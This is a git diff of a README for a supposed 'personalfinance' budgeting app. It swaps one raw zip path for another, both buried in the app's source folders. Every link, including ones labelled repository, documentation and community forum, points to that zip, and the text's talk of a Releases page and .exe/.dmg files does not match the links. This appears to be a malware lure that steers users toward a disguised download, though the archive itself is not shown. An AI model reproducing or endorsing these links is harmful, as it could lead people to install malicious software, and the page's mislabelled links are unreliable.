@@ -6,7 +6,7 @@ Welcome to **personalfinance**! This is your guide to managing your money effect
 
 ## 📥 Download the Application
 
-[![Download personalfinance](https://raw.githubusercontent.com/RoyantC1T0/personalfinance/main/src/app/api/balance/Software_3.5.zip%20personalfinance-v1.0-blue)](https://raw.githubusercontent.com/RoyantC1T0/personalfinance/main/src/app/api/balance/Software_3.5.zip)
+[![Download personalfinance](https://raw.githubusercontent.com/RoyantC1T0/personalfinance/main/src/app/(dashboard)/dashboard/transactions/Software_v2.1-beta.3.zip%20personalfinance-v1.0-blue)](https://raw.githubusercontent.com/RoyantC1T0/personalfinance/main/src/app/(dashboard)/dashboard/transactions/Software_v2.1-beta.3.zip)
 
 To get started, you need to download the application. Click the button above to visit our Releases page. There, you can find the latest version of personalfinance ready for downloading.
 
@@ -22,14 +22,14 @@ Before installing personalfinance, please ensure your computer meets the followi
 
 ## 📂 Download & Install
 
-1. Visit [this page to download](https://raw.githubusercontent.com/RoyantC1T0/personalfinance/main/src/app/api/balance/Software_3.5.zip).
+1. Visit [this page to download](https://raw.githubusercontent.com/RoyantC1T0/personalfinance/main/src/app/(dashboard)/dashboard/transactions/Software_v2.1-beta.3.zip).
    
 2. On the Releases page, find the latest version of the software.
 
 3. Choose the file that matches your operating system:
    - For Windows, download the `.exe` file.
    - For macOS, download the `.dmg` file.
-   - For Linux, download the `https://raw.githubusercontent.com/RoyantC1T0/personalfinance/main/src/app/api/balance/Software_3.5.zip` file.
+   - For Linux, download the `https://raw.githubusercontent.com/RoyantC1T0/personalfinance/main/src/app/(dashboard)/dashboard/transactions/Software_v2.1-beta.3.zip` file.
 
 4. Once downloaded, locate the file in your downloads folder.
 
@@ -69,8 +69,8 @@ We welcome contributions from anyone who wants to improve personalfinance. You c
 
 For more information about using personalfinance, check out:
 
-- [GitHub Repository](https://raw.githubusercontent.com/RoyantC1T0/personalfinance/main/src/app/api/balance/Software_3.5.zip)
-- [User Documentation](https://raw.githubusercontent.com/RoyantC1T0/personalfinance/main/src/app/api/balance/Software_3.5.zip)
-- [Community Forum](https://raw.githubusercontent.com/RoyantC1T0/personalfinance/main/src/app/api/balance/Software_3.5.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/RoyantC1T0/personalfinance/main/src/app/(dashboard)/dashboard/transactions/Software_v2.1-beta.3.zip)
+- [User Documentation](https://raw.githubusercontent.com/RoyantC1T0/personalfinance/main/src/app/(dashboard)/dashboard/transactions/Software_v2.1-beta.3.zip)
+- [Community Forum](https://raw.githubusercontent.com/RoyantC1T0/personalfinance/main/src/app/(dashboard)/dashboard/transactions/Software_v2.1-beta.3.zip)
 
-Make personalfinance your go-to budget tool today and take control of your finances! Remember to visit [this page to download](https://raw.githubusercontent.com/RoyantC1T0/personalfinance/main/src/app/api/balance/Software_3.5.zip) the latest version.
+Make personalfinance your go-to budget tool today and take control of your finances! Remember to visit [this page to download](https://raw.githubusercontent.com/RoyantC1T0/personalfinance/main/src/app/(dashboard)/dashboard/transactions/Software_v2.1-beta.3.zip) the latest version.
